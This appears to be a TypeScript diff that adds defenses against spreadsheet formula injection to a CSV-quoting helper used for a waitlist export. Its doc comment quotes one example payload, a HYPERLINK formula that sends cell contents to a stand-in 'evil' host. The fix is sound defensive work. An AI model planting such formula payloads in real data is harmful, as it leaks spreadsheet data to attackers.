@@ -93,9 +93,27 @@ export function downloadCsv(csv: string, filename: string): boolean {
   );
 }
 
-/** Quotes a value for CSV: doubles embedded quotes and always wraps. */
+/**
+ * Quotes a value for CSV: doubles embedded quotes, always wraps, and defuses
+ * spreadsheet formula injection.
+ *
+ * The waitlist export is admin-facing but its CONTENT is whatever a stranger
+ * typed into a public form. Excel, LibreOffice and Sheets all execute a cell
+ * beginning with `=`, `+`, `-` or `@` as a formula, so a signup named
+ * `=HYPERLINK("https://evil/"&A1,"click")` runs the moment the owner opens the
+ * file — quoting alone does not stop it, because the quotes are stripped as the
+ * CSV is parsed. Prefixing with an apostrophe forces a literal string; the
+ * apostrophe is not shown by the spreadsheet.
+ *
+ * Values that parse as numbers are exempt so a legitimate `-12` stays numeric.
+ */
 export function csvCell(value: unknown): string {
-  return `"${String(value ?? "").replace(/"/g, '""')}"`;
+  const raw = String(value ?? "");
+  const startsDangerously = /^[=+\-@\t\r]/.test(raw);
+  const isNumber = raw.trim() !== "" && Number.isFinite(Number(raw));
+  const safe = startsDangerously && !isNumber ? `'${raw}` : raw;
+
+  return `"${safe.replace(/"/g, '""')}"`;
 }
 
 /** Builds a CSV document from a header row plus data rows. */
